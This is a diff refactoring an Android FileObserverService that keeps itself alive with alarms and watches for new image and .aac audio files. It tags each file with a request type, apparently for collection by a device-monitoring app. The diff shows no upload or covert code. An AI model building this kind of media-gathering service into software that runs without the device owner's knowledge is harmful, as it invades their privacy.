@@ -12,10 +12,10 @@ import android.content.Intent;
 import android.os.Environment;
 import android.os.IBinder;
 
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WhileTheMethod;
+import com.inet.android.utils.ValueWork;
 
 public class FileObserverService extends Service {
 	private static final int SERVICE_REQUEST_CODE = 21;
@@ -55,20 +55,22 @@ public class FileObserverService extends Service {
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
 
-		isImageObserver = WhileTheMethod.getState(6, this);
-		isAudioObserver = WhileTheMethod.getState(7, this);
+		isImageObserver = ValueWork.getState(ConstantValue.TYPE_IMAGE_REQUEST,
+				this);
+		isAudioObserver = ValueWork.getState(ConstantValue.TYPE_AUDIO_REQUEST,
+				this);
+		Logging.doLog(LOG_TAG, "state observer: " + isImageObserver,
+				"state observer: " + isAudioObserver);
 
 		if (isImageObserver == 0 && isAudioObserver == 0) {
 			stopWatcher();
 			return 0;
 		}
 
-		// Logging.doLog(LOG_TAG, "state observer: " +
-		// stateImage.getStateObserver(),
-		// "state observer: " + stateImage.getStateObserver());
-
+		
 		if (fileObs != null) {
-			Logging.doLog(LOG_TAG, "start" + fileObs.getState(), "start" + fileObs.getState());
+			Logging.doLog(LOG_TAG, "start" + fileObs.getState(), "start"
+					+ fileObs.getState());
 			if (fileObs.getState() == false) {
 				startWatcher();
 			}
@@ -133,7 +135,7 @@ public class FileObserverService extends Service {
 				}
 			} else
 				return;
-			typeValue = ConstantRequest.TYPE_IMAGE_REQUEST;
+			typeValue = ConstantValue.TYPE_IMAGE_REQUEST;
 			Logging.doLog(LOG_TAG, "data[image]", "data[image]");
 		}
 		if (path.endsWith(".aac") && isAudioObserver == 1) {
@@ -142,7 +144,7 @@ public class FileObserverService extends Service {
 			Logging.doLog(LOG_TAG, "data[audio]", "data[audio]");
 
 			if (RequestList.getLastFile().equals(path))
-				typeValue = ConstantRequest.TYPE_AUDIO_REQUEST;
+				typeValue = ConstantValue.TYPE_AUDIO_REQUEST;
 			else
 				RequestList.setLastFile(path);
 
